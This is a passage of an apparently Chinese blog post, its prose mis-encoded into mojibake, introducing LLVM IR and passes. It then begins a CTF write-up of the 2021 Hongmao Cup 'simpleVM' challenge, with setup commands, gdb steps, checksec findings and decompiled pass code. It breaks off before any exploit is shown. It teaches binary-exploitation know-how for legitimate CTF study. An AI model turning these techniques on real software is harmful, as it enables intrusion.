        <content type="html"><![CDATA[<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>æ—¢ç„¶è¯´åˆ°<code>llvm pass pwn</code>ï¼Œæˆ‘ä»¬è‚¯å®šè¦å…ˆäº†è§£<code>llvm</code>åˆ°åº•æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿<br>å­¦è¿‡ç¼–è¯‘åŸç†çš„äººåº”è¯¥éƒ½çŸ¥é“ï¼Œç¼–è¯‘è¿‡ç¨‹ä¸»è¦å¯ä»¥åˆ’åˆ†ä¸ºå‰ç«¯ä¸åç«¯ï¼š  </p><ul><li>å‰ç«¯æŠŠæºä»£ç ç¿»è¯‘æˆä¸­é—´è¡¨ç¤º (<code>IR</code>)</li><li>åç«¯æŠŠIRç¼–è¯‘æˆç›®æ ‡å¹³å°çš„æœºå™¨ç ã€‚å½“ç„¶ï¼Œ<code>IR</code>ä¹Ÿå¯ä»¥ç»™è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œ</li></ul><p>ç„¶è€Œï¼Œç»å…¸çš„ç¼–è¯‘å™¨å¦‚<code>gcc</code>åœ¨è®¾è®¡ä¸Šéƒ½æ˜¯æä¾›ä¸€æ¡é¾™æœåŠ¡çš„ï¼š ä½ ä¸éœ€è¦çŸ¥é“å®ƒä½¿ç”¨çš„<code>IR</code>æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œå®ƒä¹Ÿä¸ä¼šæš´éœ²ä¸­é—´æ¥å£æ¥ç»™ä½ æ“ä½œå®ƒçš„<code>IR</code>ã€‚ æ¢å¥è¯è¯´ï¼Œä»å‰ç«¯åˆ°åç«¯ï¼Œè¿™äº›ç¼–è¯‘å™¨çš„å¤§é‡ä»£ç éƒ½æ˜¯å¼ºè€¦åˆçš„ã€‚  </p><p>è¿™æ ·åšæœ‰å¥½å¤„ä¹Ÿæœ‰åå¤„ã€‚å¥½å¤„æ˜¯ï¼Œå› ä¸ºä¸éœ€è¦æš´éœ²ä¸­é—´è¿‡ç¨‹çš„æ¥å£ï¼Œå®ƒå¯ä»¥åœ¨å†…éƒ¨åšä»»ä½•æƒ³åšçš„å¹³å°ç›¸å…³çš„ä¼˜åŒ–ã€‚ è€Œåå¤„æ˜¯ï¼Œæ¯å½“ä¸€ä¸ªæ–°çš„å¹³å°å‡ºç°ï¼Œè¿™äº›ç¼–è¯‘å™¨éƒ½è¦å„è‡ªä¸ºæ”¿å®ç°ä¸€ä¸ªä»è‡ªå·±çš„<code>IR</code>åˆ°æ–°å¹³å°çš„åç«¯ã€‚ ç”šè‡³å¦‚æœå½“ä¸€ç§æ–°è¯­è¨€å‡ºç°ï¼Œä¸”éœ€è¦å®ç°ä¸€ä¸ªæ–°çš„ç¼–è¯‘å™¨ï¼Œé‚£ä¹ˆå¯èƒ½éœ€è¦è®¾è®¡ä¸€ä¸ªæ–°çš„<code>IR</code>ï¼Œä»¥åŠé’ˆå¯¹å¤§éƒ¨åˆ†å¹³å°å®ç°è¿™ä¸ª<code>IR</code>çš„åç«¯ã€‚ ä¸å¦¨æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæœ‰Mç§è¯­è¨€ã€<code>N</code>ç§ç›®æ ‡å¹³å°ï¼Œé‚£ä¹ˆæœ€åæƒ…å†µä¸‹è¦å®ç° <code>M*N</code> ä¸ªå‰åç«¯ã€‚è¿™æ˜¯å¾ˆä½æ•ˆçš„ã€‚  </p><p>å› æ­¤ï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šæƒ³ï¼Œå¦‚æœå¤§å®¶éƒ½å…±ç”¨ä¸€ç§<code>IR</code>å‘¢ï¼Ÿ é‚£ä¹ˆæ¯å½“æ–°å¢åŠ ä¸€ç§è¯­è¨€ï¼Œæˆ‘ä»¬å°±åªè¦æ·»åŠ ä¸€ä¸ªè¿™ä¸ªè¯­è¨€åˆ°<code>IR</code>çš„å‰ç«¯ï¼› æ¯å½“æ–°å¢åŠ ä¸€ç§ç›®æ ‡å¹³å°ï¼Œæˆ‘ä»¬å°±åªè¦æ·»åŠ ä¸€ä¸ª<code>IR</code>åˆ°è¿™ä¸ªç›®æ ‡å¹³å°çš„åç«¯ã€‚ å¦‚æœæœ‰Mç§è¯­è¨€ã€Nç§ç›®æ ‡å¹³å°ï¼Œé‚£ä¹ˆæœ€ä¼˜æƒ…å†µä¸‹æˆ‘ä»¬åªè¦å®ç° <code>M+N</code> ä¸ªå‰åç«¯ã€‚  </p><p>è€Œ<code>LLVM</code>å°±æ˜¯è¿™æ ·ä¸€ä¸ªé¡¹ç›®ã€‚<code>LLVM</code>çš„æ ¸å¿ƒè®¾è®¡äº†ä¸€ä¸ªå« <code>LLVM IR</code> çš„ä¸­é—´è¡¨ç¤ºï¼Œ å¹¶ä»¥åº“(<code>Library</code>) çš„æ–¹å¼æä¾›ä¸€ç³»åˆ—æ¥å£ï¼Œ ä¸ºä½ æä¾›è¯¸å¦‚æ“ä½œ<code>IR</code>ã€ç”Ÿæˆç›®æ ‡å¹³å°ä»£ç ç­‰ç­‰åç«¯çš„åŠŸèƒ½ã€‚  </p><p>é‚£ä¹ˆ <code>LLVM Pass</code> åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ <code>Pass</code>å°±æ˜¯â€œéå†ä¸€é<code>IR</code>ï¼Œå¯ä»¥åŒæ—¶å¯¹å®ƒåšä¸€äº›æ“ä½œâ€çš„æ„æ€ã€‚ç¿»è¯‘æˆä¸­æ–‡åº”è¯¥å«â€œè¶Ÿâ€ã€‚ åœ¨å®ç°ä¸Šï¼Œ<code>LLVM</code>çš„æ ¸å¿ƒåº“ä¸­ä¼šç»™ä½ ä¸€äº› <code>Pass</code>ç±» å»ç»§æ‰¿ã€‚ä½ éœ€è¦å®ç°å®ƒçš„ä¸€äº›æ–¹æ³•ã€‚ æœ€åä½¿ç”¨<code>LLVM</code>çš„ç¼–è¯‘å™¨ä¼šæŠŠå®ƒç¿»è¯‘å¾—åˆ°çš„<code>IR</code>ä¼ å…¥<code>Pass</code>é‡Œï¼Œç»™ä½ éå†å’Œä¿®æ”¹ã€‚  </p><p>ä¸‹é¢åˆ—å‡ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å‘½ä»¤è¡Œå·¥å…·ï¼š  </p><ul><li><code>llvm-as</code>ï¼šæŠŠ<code>LLVM IR</code>ä»äººç±»èƒ½çœ‹æ‡‚çš„æ–‡æœ¬æ ¼å¼æ±‡ç¼–æˆäºŒè¿›åˆ¶æ ¼å¼ã€‚æ³¨æ„ï¼šæ­¤å¤„å¾—åˆ°çš„ä¸æ˜¯ç›®æ ‡å¹³å°çš„æœºå™¨ç ã€‚</li><li><code>llvm-dis</code>ï¼š<code>llvm-as</code>çš„é€†è¿‡ç¨‹ï¼Œå³åæ±‡ç¼–ã€‚ ä¸è¿‡è¿™é‡Œçš„åæ±‡ç¼–çš„å¯¹è±¡æ˜¯<code>LLVM IR</code>çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œè€Œä¸æ˜¯æœºå™¨ç ã€‚</li><li><code>opt</code>ï¼šä¼˜åŒ–<code>LLVM IR</code>ã€‚è¾“å‡ºæ–°çš„<code>LLVM IR</code>ã€‚</li><li><code>llc</code>ï¼šæŠŠ<code>LLVM IR</code>ç¼–è¯‘æˆæ±‡ç¼–ç ã€‚éœ€è¦ç”¨<code>as</code>è¿›ä¸€æ­¥å¾—åˆ°æœºå™¨ç ã€‚</li><li><code>lli</code>ï¼šè§£é‡Šæ‰§è¡Œ<code>LLVM IR</code>ã€‚</li></ul><p>ä¸‹é¢ç®€å•èŠèŠ<code>llvm IR</code>  </p><h3 id="ä½•ä¸ºLLVM-IR"><a href="#ä½•ä¸ºLLVM-IR" class="headerlink" title="ä½•ä¸ºLLVM IR"></a>ä½•ä¸ºLLVM IR</h3><ul><li><code>LVM IR</code> æ˜¯ä¸€é—¨ä½çº§ç¼–ç¨‹è¯­è¨€ï¼Œè¯­æ³•ç±»ä¼¼äºæ±‡ç¼–</li><li>ä»»ä½•é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚<code>C++</code>ï¼‰éƒ½å¯ä»¥ç”¨ <code>LLVM IR</code> è¡¨ç¤º</li><li>åŸºäº <code>LLVM IR</code> å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œä»£ç ä¼˜åŒ–(ä»»ä½•ç¼–ç¨‹è¯­è¨€éƒ½èƒ½ç»Ÿä¸€è½¬æ¢ä¸º<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="LLVM-IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"><a href="#LLVM-IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="LLVM IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"></a>LLVM IRçš„ä¸¤ç§è¡¨ç¤ºæ–¹æ³•</h3><ul><li>äººç±»å¯ä»¥é˜…è¯»çš„æ–‡æœ¬å½¢å¼ï¼Œæ–‡ä»¶åç¼€ä¸º <code>.ll</code></li><li>æ˜“äºæœºå™¨å¤„ç†çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ–‡ä»¶åç¼€ä¸º <code>.bc</code></li></ul><p>ä¸‹é¢ç»™å‡ºä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼š  </p><ul><li>.c -&gt; .llï¼šclang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>ä¸‹é¢æ¥åˆ†æå®˜æ–¹æ–‡æ¡£ä¸­ä¸€ä¸ªå…¥é—¨çº§åˆ«çš„<code>llvm pass</code>ç¨‹åºï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// é‡å†™runOnFunctionï¼Œä½¿å¾—æ¯éå†åˆ°ä¸€ä¸ªå‡½æ•°æ—¶å°±è¾“å‡ºå‡½æ•°å</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// ä½¿ç”¨ RegisterPass å®æ³¨å†Œ Hello Passã€‚è¿™å…è®¸å®ƒé€šè¿‡å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™LLVMå·¥å…·</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ä¸»è¦å†…å®¹æ˜¯æ³¨å†Œäº†ä¸€ä¸ª<code>Hello</code>å‡½æ•°ï¼Œé‡å†™äº†<code>runOnFunction</code>å‡½æ•°ï¼Œä½¿å¾—æ¯éå†åˆ°ä¸€ä¸ªå‡½æ•°æ—¶å°±è¾“å‡ºå‡½æ•°åã€‚  </p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨<code>pwn</code>é¢˜ä¸­ï¼Œæ¼æ´ä¸»è¦æ¥è‡ªäº<code>so</code>æ–‡ä»¶ä¸­ï¼Œè€Œæ¼æ´å¤šäº§ç”Ÿäºé‡å†™äº†<code>so</code>æ–‡ä»¶ä¸­çš„<code>runOnFunction</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨<code>ida</code>ä¸­æœç´¢<code>vtable</code>æ¥å®šä½è¿™ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæˆ‘ä»¬è¦æ”»å‡»çš„åˆ™æ˜¯<code>opt</code>è¿™ä¸ª<code>elf</code>æ–‡ä»¶<br>è‡³äº<code>PASS</code>æ³¨å†Œçš„åç§°ï¼Œä¸€èˆ¬ä¼šåœ¨<code>README</code>æ–‡ä»¶ä¸­ç»™å‡ºï¼Œè‹¥æ˜¯æ²¡æœ‰ç»™å‡ºï¼Œå¯é€šè¿‡å¯¹<code>__cxa_atexit</code>å‡½æ•°â€œäº¤å‰å¼•ç”¨â€æ¥å®šä½  </p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä¸‹è½½å¸¸è§çš„<code>clang</code>å’Œ<code>llvm</code>ç‰ˆæœ¬  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>opt</code>æ˜¯<code>LLVM</code>çš„ä¼˜åŒ–å™¨å’Œåˆ†æå™¨ï¼Œå¯åŠ è½½æŒ‡å®šçš„æ¨¡å—ï¼Œå¯¹è¾“å…¥çš„<code>LLVM IR</code>æˆ–è€…<code>LLVM</code>å­—èŠ‚ç è¿›è¡Œä¼˜åŒ–æˆ–åˆ†æã€‚<code>CTF</code>é¢˜ç›®ä¸€èˆ¬ä¼šç»™å‡ºæ‰€éœ€ç‰ˆæœ¬çš„<code>opt</code>æ–‡ä»¶ï¼ˆå¯ç”¨<code>./opt --version</code>æŸ¥çœ‹ç‰ˆæœ¬ï¼‰æˆ–è€…åœ¨<code>README</code>æ–‡æ¡£ä¸­å‘ŠçŸ¥<code>opt</code>ç‰ˆæœ¬ã€‚å®‰è£…å¥½<code>llvm</code>åï¼Œå¯åœ¨<code>/usr/lib/llvm-xx/bin/opt</code>è·¯å¾„ä¸‹æ‰¾åˆ°å¯¹åº”<code>llvm</code>ç‰ˆæœ¬çš„<code>opt</code>æ–‡ä»¶ï¼ˆä¸€èˆ¬ä¸å¼€<code>PIE</code>ä¿æŠ¤ï¼‰  </p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="çº¢å¸½æ¯-2021-simpleVM"><a href="#çº¢å¸½æ¯-2021-simpleVM" class="headerlink" title="[çº¢å¸½æ¯ 2021] simpleVM"></a>[çº¢å¸½æ¯ 2021] simpleVM</h3><p>å¥½ä¹ æƒ¯ï¼Œä¸Šæ¥å…ˆç»™<code>opt-8</code>æ¥ä¸€å‘<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç°ç¨‹åºå¹¶æ²¡æœ‰å¼€å¯<code>PIE</code>ä¿æŠ¤è€Œä¸”<code>got</code>è¡¨å¯æ”¹<br>å°†<code>VMPass.so</code>æ‹–è¿›<code>ida</code>ï¼Œæ¼æ´é€šå¸¸éƒ½åœ¨è¿™ä¸€ä¸ª<code>so</code>æ–‡ä»¶ä¸­<br>æˆ‘ä»¬é¦–å…ˆçœ‹<code>start</code>å‡½æ•°ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>PASS</code>æ³¨å†Œåç§°ä¸º<code>VMPass</code>ã€‚æˆ‘ä»¬å°è¯•åœ¨<code>ida</code>ä¸­æŸ¥æ‰¾<code>runOnFunction</code>å‡½æ•°ï¼Œç»“æœå‘ç°è¿™ä¸ªå‡½æ•°çš„ç¬¦å·è¡¨ç»™åˆ äº†ï¼Ÿå›¾ç‰‡ä¸­çš„<code>sub_6830</code>å‡½æ•°å³ä¸ºæˆ‘ä»¬è¦æ‰¾çš„<code>runOnFunction</code>å‡½æ•°å‡½æ•°  </p><img src="/2024/03/15/llvm/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹<code>runOnFunction</code>å‡½æ•°  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹å‡½æ•°å…ˆé€šè¿‡<code>getName(a2)</code>æ¥è·å–<code>.ll</code>æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°åå­—ï¼Œå¦‚æœè¯¥å‡½æ•°çš„åå­—ä¸º<code>o0o0o0o0</code>ï¼Œåˆ™ä¼šè¿›å…¥<code>sub_6AC0</code>è¿™ä¸ªå‡½æ•°è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†<br>å®šä½åˆ°å…³é”®å‡½æ•°<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] 